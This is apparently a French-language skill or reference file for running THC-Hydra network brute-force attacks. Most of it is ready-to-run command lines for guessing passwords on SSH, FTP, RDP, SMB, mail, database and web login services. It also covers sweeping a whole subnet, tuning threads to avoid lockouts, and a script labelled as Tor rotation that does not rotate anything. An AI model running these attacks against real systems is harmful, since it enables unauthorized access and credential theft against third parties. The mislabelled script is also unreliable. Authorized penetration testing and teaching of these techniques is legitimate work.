---
name: hydra
description: Hydra — brute-force de services réseau, protocoles supportés, formules HTTP POST/GET, wordlists personnalisées, optimisation de performance, attaque par cibles multiples, et scénarios de pentest.
---

# Hydra — Brute-force de Services Réseau

## Présentation

Hydra (THC-Hydra) est l'outil de brute-force réseau le plus rapide. Supporte 50+ protocoles pour des attaques de mots de passe automatisées.

**Installation :**
```bash
sudo apt install hydra
# Compilation depuis source (dernière version)
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra && ./configure && make && sudo make install
```

---

## Syntaxe de base

```bash
# Un seul utilisateur, une wordlist de mots de passe
hydra -l admin -P /usr/share/wordlists/rockyou.txt <cible> <service>

# Liste d'utilisateurs, un seul mot de passe
hydra -L users.txt -p Password123 <cible> <service>

# Liste utilisateurs + liste mots de passe
hydra -L users.txt -P rockyou.txt <cible> <service>

# Fichier de combinaisons user:pass
hydra -C combos.txt <cible> <service>
```

---

## Protocoles supportés

### Authentification réseau
```bash
# SSH (port 22)
hydra -l root -P rockyou.txt 192.168.1.10 ssh
hydra -L users.txt -P rockyou.txt -s 2222 192.168.1.10 ssh

# FTP (port 21)
hydra -l ftpuser -P rockyou.txt 192.168.1.10 ftp
hydra -L users.txt -P rockyou.txt ftp://192.168.1.10

# Telnet (port 23)
hydra -l admin -P rockyou.txt telnet://192.168.1.10

# RDP (port 3389) — Windows
hydra -l administrator -P rockyou.txt rdp://192.168.1.10
hydra -L users.txt -P rockyou.txt 192.168.1.10 rdp

# VNC (port 5900)
hydra -P rockyou.txt -t 1 192.168.1.10 vnc
# VNC n'a que password (pas d'username)

# SMB / Samba
hydra -l admin -P rockyou.txt 192.168.1.10 smb
hydra -L users.txt -P rockyou.txt smb://192.168.1.10
```

### Services mail
```bash
# POP3 (port 110)
hydra -l user@domain.com -P rockyou.txt pop3://192.168.1.10

# IMAP (port 143)
hydra -l user -P rockyou.txt imap://192.168.1.10

# SMTP (port 25, auth)
hydra -l user -P rockyou.txt smtp://192.168.1.10
```

### Bases de données
```bash
# MySQL (port 3306)
hydra -l root -P rockyou.txt mysql://192.168.1.10

# PostgreSQL (port 5432)
hydra -l postgres -P rockyou.txt postgres://192.168.1.10

# MSSQL (port 1433)
hydra -l sa -P rockyou.txt mssql://192.168.1.10

# Oracle (port 1521)
hydra -l system -P rockyou.txt oracle://192.168.1.10/sid

# Redis (port 6379)
hydra -P rockyou.txt redis://192.168.1.10
```

### Web
```bash
# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"

# HTTPS form
hydra -l admin -P rockyou.txt https-post-form://192.168.1.10/login \
    "username=^USER^&password=^PASS^&submit=Login:Invalid credentials"

# HTTP GET form (token dans URL)
hydra -l admin -P rockyou.txt http-get-form \
    "/login.php?user=^USER^&pass=^PASS^:F=login failed"

# HTTP Headers auth
hydra -l admin -P rockyou.txt http-head://192.168.1.10/secure
hydra -l admin -P rockyou.txt http-post://192.168.1.10/submit
```

### Autres services
```bash
# LDAP (port 389)
hydra -l admin -P rockyou.txt ldap://192.168.1.10

# SNMP (port 161)
hydra -P rockyou.txt -t 32 192.168.1.10 snmp

# SIP/VoIP (port 5060)
hydra -l 1000 -P rockyou.txt sip://192.168.1.10

# CVS (port 2401)
hydra -l admin -P rockyou.txt cvs://192.168.1.10

# ICQ (port 5190)
hydra -l admin -P rockyou.txt icq://192.168.1.10

# NCP (Netware Core Protocol)
hydra -l admin -P rockyou.txt ncp://192.168.1.10

# NNTPS (port 563)
hydra -l admin -P rockyou.txt nntps://192.168.1.10
```

---

## Formulaires HTTP POST — Format détaillé

### Syntaxe du module http-post-form
```bash
hydra -l user -P pass.txt target http-post-form \
    "chemin:paramètres:conditions"
```

### Les 3 parties du format
```bash
# 1. CHEMIN : "/login.php"
# 2. PARAMÈTRES : "user=^USER^&pass=^PASS^&csrf=CSRF_TOKEN"
#    ^USER^ = remplacé par le nom d'utilisateur
#    ^PASS^ = remplacé par le mot de passe
#    ^USER64^ / ^PASS64^ = version Base64
# 3. CONDITIONS :
#    F=string  = Échec si cette chaîne apparaît
#    S=string  = Succès si cette chaîne apparaît
#    C=/path   = Extraire le cookie de session de la réponse

# Exemple concret : formulaire avec CSRF token fixe
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^&csrf=token123:F=Invalid"

# Exemple : condition de succès
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login:user=^USER^&pass=^PASS^:S=Welcome back"

# Exemple : erreur HTTP comme condition
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:F=401"
```

### Formulaire avec CSRF dynamique
```bash
# Hydra ne peut pas extraire le CSRF token automatiquement
# Solution alternative : utiliser un script personnalisé

# 1. D'abord extraire le CSRF token de la page
curl -c /tmp/cookies.txt http://cible.com/login.php | grep csrf

# 2. Bruteforce avec token fixe (valable pour quelques minutes)
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^&csrf_token=VALEUR:F=Incorrect"
```

---

## Cibles multiples

### Fichier de cibles
```bash
# targets.txt — une cible par ligne
192.168.1.1 ssh
192.168.1.10 ssh
192.168.1.20 ssh

# Attaque
hydra -L users.txt -P rockyou.txt -M targets.txt

# Avec port personnalisé
# targets.txt
192.168.1.10:2222 ssh
```

### Plage d'IPs
```bash
# CIDR
hydra -l admin -P rockyou.txt -M targets.txt ssh

# Boucle bash
for ip in 192.168.1.{1..254}; do
    hydra -l admin -P rockyou.txt $ip ssh -o "results_$ip.txt" &
done
wait
```

---

## Performance et optimisation

### Contrôle des threads
```bash
# Nombre de tâches parallèles
hydra -t 4      # 4 tâches (défaut: 16)
hydra -t 32     # Agressif (peut saturer la cible)
hydra -t 1      # Très lent, discret
```

### Options de performance
```bash
# Timeout
hydra -w 5      # Timeout 5 secondes (défaut)
hydra -w 30     # Connexion lente
hydra -w 1      # Connexion rapide

# S'arrêter au premier succès
hydra -f        # Stop on first success
hydra -F        # Stop on first success (multi-cibles)

# Limite de tentatives
hydra -T 1000   # Total de tâches max (multi-cibles)

# Tentatives de connexion
hydra -c 5      # 5 tentatives avant d'abandonner le service
```

### Optimisation par service
```bash
# SSH : -t 4 max (les serveurs SSH limitent les connexions)
hydra -l root -P rockyou.txt -t 4 192.168.1.10 ssh

# FTP : -t 16 (généralement rapide)
hydra -l ftp -P rockyou.txt -t 16 192.168.1.10 ftp

# RDP : -t 1 (RDP ne supporte pas les connexions parallèles)
hydra -l admin -P rockyou.txt -t 1 192.168.1.10 rdp

# HTTP : -t 32 (requêtes HTTP rapides)
hydra -l admin -P rockyou.txt -t 32 192.168.1.10 http-post-form "..."

# SNMP : -t 32 (très rapide)
hydra -P rockyou.txt -t 32 192.168.1.10 snmp

# VNC : -t 1 (VNC ne supporte pas les connexions parallèles)
hydra -P rockyou.txt -t 1 192.168.1.10 vnc
```

---

## Wordlists et préparation

### Wordlists courantes
```bash
/usr/share/wordlists/rockyou.txt           # 14M mots
/usr/share/wordlists/rockyou.txt.gz        # compressée
/usr/share/seclists/Passwords/...          # SecLists
/usr/share/wordlists/fasttrack.txt         # FastTrack
```

### Créer des wordlists ciblées
```bash
# Basée sur les infos de la cible
cat > target_words.txt << EOF
entreprise2024
societe123
paris2024
admin2024
summer2024
winter2024
password123
changeme
administrator
root
admin
EOF

# Combinaisons de mots
crunch 8 12 abcdef123 -o custom.txt
```

### Module de test (dry-run)
```bash
# Tester que le module fonctionne avant le brute-force
hydra -l admin -p test123 192.168.1.10 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:F=Invalid" -d

# -d = debug, montre les requêtes/réponses
```

---

## Sortie et logs

```bash
# Sauvegarder dans un fichier
hydra -l admin -P rockyou.txt -o results.txt 192.168.1.10 ssh

# Format JSON
hydra -l admin -P rockyou.txt -o results.json -b json 192.168.1.10 ssh

# Mode verbeux
hydra -V           # Affiche chaque tentative
hydra -vV          # Très verbeux (montre les tentatives)
hydra -d           # Debug (montre les paquets)

# Sortie simple
hydra -q           # Mode silencieux (ne montre que le résultat final)
```

---

## Scénarios complets

### 1. Brute-force SSH
```bash
# Étape 1 : vérifier que le port est ouvert
nmap -p22 192.168.1.10

# Étape 2 : énumérer les utilisateurs (si possible)
# via RID cycling ou autre méthode

# Étape 3 : brute-force SSH (lent, 4 threads)
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V -o ssh_results.txt 192.168.1.10 ssh

# Avec liste d'utilisateurs
hydra -L users.txt -P rockyou.txt \
    -t 4 -V -o ssh_results.txt 192.168.1.10 ssh
```

### 2. Formulaire web login
```bash
# Étape 1 : capturer la requête avec Burp
# POST /login.php HTTP/1.1
# Host: cible.com
# Content-Type: application/x-www-form-urlencoded
# username=admin&password=test&submit=Login

# Étape 2 : identifier les messages d'erreur
# "Invalid username or password"

# Étape 3 : brute-force
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login.php:username=^USER^&password=^PASS^&submit=Login:\
Invalid" -V -o web_results.txt
```

### 3. Brute-force RDP
```bash
# ATTENTION : peut bloquer le compte !
hydra -l administrator -P rockyou.txt \
    -t 1 -V -o rdp_results.txt rdp://192.168.1.10

# Alternative : crowbar (pour RDP, plus fiable)
crowbar -b rdp -s 192.168.1.10/32 -u admin -C rockyou.txt
```

### 4. Attaque sur plusieurs services
```bash
# Même liste sur SSH, FTP, RDP
for service in ssh ftp rdp; do
    hydra -L users.txt -P rockyou.txt \
        -t 4 -o "results_${service}.txt" 192.168.1.10 $service
done
```

### 5. HTTP API REST brute-force
```bash
# API JSON
hydra -l admin -P rockyou.txt 192.168.1.10 https-post-form \
    "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:S=token"

# API Basic Auth
hydra -l admin -P rockyou.txt 192.168.1.10 http-get \
    "/api/admin"
```

---

## Scripts auxiliaires

### Script d'élimination des comptes verrouillés
```bash
#!/bin/bash
# kill_hydra.sh — Tuer hydra si trop d'échecs
hydra -l admin -P rockyou.txt 192.168.1.10 ssh &
PID=$!
sleep 60
# Vérifier si les logs montrent des erreurs
if grep -q "Connection closed" hydra.log; then
    kill $PID
    echo "Trop d'erreurs, arrêt"
fi
```

### Script de rotation de proxy
```bash
# Rotation Tor
#!/bin/bash
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -o out.txt &
while true; do
    hydra -l admin -P rockyou.txt ssh://192.168.1.10 -o out.txt
    sleep 10
done
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "Could not connect" | Vérifier que le service tourne, port correct |
| "Too many login attempts" | Réduire -t, ajouter -w (timeout) |
| "Account locked" | Arrêter ! Utiliser password spraying à la place |
| "Module not found" | Réinstaller hydra (`./configure && make`) |
| "Invalid answer" | Le format du module est incorrect (vérifier avec -d) |
| CSRF token expire | Hydra ne gère pas les tokens dynamiques → script custom |
| Rate limiting | Réduire -t, ajouter délai entre requêtes |

---

## Antisèche rapide

```bash
# SSH
hydra -l root -P rockyou.txt -t 4 192.168.1.10 ssh

# FTP
hydra -L users.txt -P rockyou.txt ftp://192.168.1.10

# RDP (lent, 1 thread max)
hydra -l admin -P rockyou.txt -t 1 rdp://192.168.1.10

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
    "/login:user=^USER^&pass=^PASS^:F=Invalid"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# Multi-cibles
hydra -L users.txt -P rockyou.txt -M targets.txt

# Stop on first
hydra -l admin -P rockyou.txt -f 192.168.1.10 ssh

# VNC (no username)
hydra -P rockyou.txt -t 1 192.168.1.10 vnc

# Debug (tester le module)
hydra -l test -p test -d 192.168.1.10 http-post-form "...:F=Invalid"
```